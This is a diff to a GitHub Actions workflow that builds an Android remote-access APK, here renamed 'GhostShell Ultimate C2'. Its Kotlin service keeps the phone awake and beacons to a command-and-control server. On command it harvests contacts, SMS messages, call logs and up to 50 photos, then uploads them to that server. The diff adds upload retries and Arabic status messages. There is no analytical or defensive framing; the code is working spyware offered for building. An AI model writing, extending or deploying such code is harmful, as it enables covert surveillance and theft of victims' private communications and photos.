@@ -1,11 +1,11 @@
-name: Elite Raw Binary C2 Android Node Builder
+name: GhostShell Ultimate C2 Android Node Builder
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Elite Operational C2 APK
+    name: Build GhostShell Ultimate APK
     runs-on: ubuntu-latest
 
     steps:
@@ -197,11 +197,12 @@ jobs:
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
               private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/unified/stream"
               private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/unified/upload_raw"
+              private val MAX_RETRIES = 3
 
               override fun onCreate() {
                   super.onCreate()
                   val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AbodC2::SyncLock")
+                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GhostShell::SyncLock")
                   wakeLock?.acquire(10 * 60 * 60 * 1000L)
                   startForegroundServiceNotification()
               }
@@ -238,7 +239,7 @@ jobs:
                               conn.connectTimeout = 15000
                               conn.readTimeout = 15000
 
-                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Node active from $nodeModel\"}"
+                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] GhostShell Node active from $nodeModel\"}"
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                   os.write(reportJson)
@@ -262,7 +263,7 @@ jobs:
                                           val callsData = readCallLogs()
                                           sendReportToServer(deviceId, nodeModel, callsData)
                                       } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
-                                          zipAndUploadCameraFolder(deviceId, nodeModel)
+                                          compressAndUploadOnDisk(deviceId, nodeModel)
                                       } else if (responseStr.contains("EXTRACT_PHOTOS")) {
                                           extractAndUploadSingleFiles(deviceId, nodeModel, true)
                                       }
@@ -280,7 +281,7 @@ jobs:
               }
 
               private fun readContacts(): String {
-                  val sb = StringBuilder("=== CONTACTS EXTRACTED ===\\n")
+                  val sb = StringBuilder("=== CONTACTS EXTRACTED ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -289,17 +290,17 @@ jobs:
                           while (it.moveToNext()) {
                               val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                               val number = if (numIdx != -1) it.getString(numIdx) else ""
-                              sb.append("• $name: $number\\n")
+                              sb.append("• $name: $number\n")
                           }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error: ${e.message}\\n")
+                      sb.append("Error: ${e.message}\n")
                   }
                   return sb.toString()
               }
 
               private fun readSMS(): String {
-                  val sb = StringBuilder("=== SMS EXTRACTED ===\\n")
+                  val sb = StringBuilder("=== SMS EXTRACTED ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                       cursor?.use {
@@ -308,17 +309,17 @@ jobs:
                           while (it.moveToNext()) {
                               val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                               val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
-                              sb.append("From: $address\\nText: $body\\n-------------------\\n")
+                              sb.append("From: $address\nText: $body\n-------------------\n")
                           }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error: ${e.message}\\n")
+                      sb.append("Error: ${e.message}\n")
                   }
                   return sb.toString()
               }
 
               private fun readCallLogs(): String {
-                  val sb = StringBuilder("=== CALL LOGS EXTRACTED ===\\n")
+                  val sb = StringBuilder("=== CALL LOGS EXTRACTED ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -327,19 +328,19 @@ jobs:
                         while (it.moveToNext()) {
                             val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                             val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
-                            sb.append("Number: $number | Type: $type\\n")
+                            sb.append("Number: $number | Type: $type\n")
                         }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error: ${e.message}\\n")
+                      sb.append("Error: ${e.message}\n")
                   }
                   return sb.toString()
               }
 
-              private fun zipAndUploadCameraFolder(nodeId: String, nodeModel: String) {
+              private fun compressAndUploadOnDisk(nodeId: String, nodeModel: String) {
                   serviceScope.launch {
                       try {
-                          val zipFile = File(cacheDir, "Camera_Archive_${System.currentTimeMillis()}.zip")
+                          val zipFile = File(cacheDir, "GhostShell_Harvest_${System.currentTimeMillis()}.zip")
                           val zipOut = ZipOutputStream(FileOutputStream(zipFile))
                           
                           val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
@@ -351,14 +352,14 @@ jobs:
                           cursor?.use {
                               val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                               val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                              while (it.moveToNext() && addedCount < 30) {
+                              while (it.moveToNext() && addedCount < 50) {
                                   if (dataIdx != -1 && nameIdx != -1) {
                                       val filePath = it.getString(dataIdx)
                                       val fileName = it.getString(nameIdx)
                                       val file = File(filePath)
                                       if (file.exists() && file.isFile) {
                                           try {
-                                              zipOut.putNextEntry(ZipEntry("Camera/$fileName"))
+                                              zipOut.putNextEntry(ZipEntry("DCIM/$fileName"))
                                               file.inputStream().use { fis -> fis.copyTo(zipOut) }
                                               zipOut.closeEntry()
                                               addedCount++
@@ -372,12 +373,13 @@ jobs:
                           zipOut.close()
 
                           if (addedCount > 0 && zipFile.exists()) {
-                              uploadRawFile(nodeId, nodeModel, zipFile)
+                              sendReportToServer(nodeId, nodeModel, "📦 تم ضغط أرشيف الكاميرا ($addedCount ملف) بنجاح على القرص. جاري الرفع الصامد...")
+                              uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                           } else {
-                              sendReportToServer(nodeId, nodeModel, "No camera media found to archive.")
+                              sendReportToServer(nodeId, nodeModel, "⚠️ لم يتم العثور على ملفات وسائط للضغط.")
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "Error creating camera ZIP: ${e.message}")
+                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في محرك الضغط الخارق: ${e.message}")
                       }
                   }
               }
@@ -399,7 +401,7 @@ jobs:
                                       val fileName = it.getString(nameIdx)
                                       val file = File(filePath)
                                       if (file.exists() && file.isFile) {
-                                          uploadRawFile(nodeId, nodeModel, file)
+                                          uploadRawFileWithRetry(nodeId, nodeModel, file)
                                       }
                                   }
                               }
@@ -410,35 +412,42 @@ jobs:
                   }
               }
 
-              private fun uploadRawFile(nodeId: String, nodeModel: String, file: File) {
-                  try {
-                      val url = URL(C2_UPLOAD_URL)
-                      val conn = url.openConnection() as HttpURLConnection
-                      conn.requestMethod = "POST"
-                      conn.setRequestProperty("X-Node-ID", nodeId)
-                      conn.setRequestProperty("X-Node-Model", nodeModel)
-                      conn.setRequestProperty("X-File-Name", file.name)
-                      conn.setRequestProperty("Content-Type", "application/octet-stream")
-                      conn.doOutput = true
-                      conn.setChunkedStreamingMode(0)
-                      conn.connectTimeout = 30000
-                      conn.readTimeout = 30000
+              private fun uploadRawFileWithRetry(nodeId: String, nodeModel: String, file: File) {
+                  for (attempt in 1..MAX_RETRIES) {
+                      try {
+                          val url = URL(C2_UPLOAD_URL)
+                          val conn = url.openConnection() as HttpURLConnection
+                          conn.requestMethod = "POST"
+                          conn.setRequestProperty("X-Node-ID", nodeId)
+                          conn.setRequestProperty("X-Node-Model", nodeModel)
+                          conn.setRequestProperty("X-File-Name", file.name)
+                          conn.setRequestProperty("Content-Type", "application/octet-stream")
+                          conn.doOutput = true
+                          conn.setChunkedStreamingMode(0)
+                          conn.connectTimeout = 60000
+                          conn.readTimeout = 60000
 
-                      FileInputStream(file).use { fis ->
-                          conn.outputStream.use { os ->
-                              fis.copyTo(os)
-                              os.flush()
+                          FileInputStream(file).use { fis ->
+                              conn.outputStream.use { os ->
+                                  fis.copyTo(os)
+                                  os.flush()
+                              }
+                          }
+
+                          val responseCode = conn.responseCode
+                          conn.disconnect()
+
+                          if (responseCode == 200) {
+                              sendReportToServer(nodeId, nodeModel, "✅ تم رفع الملف الصامد بنجاح: ${file.name}")
+                              return
+                          }
+                      } catch (e: Exception) {
+                          if (attempt == MAX_RETRIES) {
+                              sendReportToServer(nodeId, nodeModel, "❌ فشل رفع الملف ${file.name} بعد $MAX_RETRIES محاولات: ${e.message}")
+                          } else {
+                              Thread.sleep(2000L)
                           }
                       }
-
-                      val responseCode = conn.responseCode
-                      conn.disconnect()
-
-                      if (responseCode != 200) {
-                          sendReportToServer(nodeId, nodeModel, "Raw upload failed with code: $responseCode")
-                      }
-                  } catch (e: Exception) {
-                      sendReportToServer(nodeId, nodeModel, "Error uploading raw file ${file.name}: ${e.message}")
                   }
               }
 
@@ -534,7 +543,7 @@ jobs:
                   mavenCentral()
               }
           }
-          rootProject.name = "AbodC2Node"
+          rootProject.name = "GhostShellC2"
           include ':app'
           EOF
 
@@ -550,5 +559,5 @@ jobs:
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Absolute-Black-C2-Node
+          name: GhostShell-Ultimate-Node
           path: app/build/outputs/apk/debug/app-debug.apk
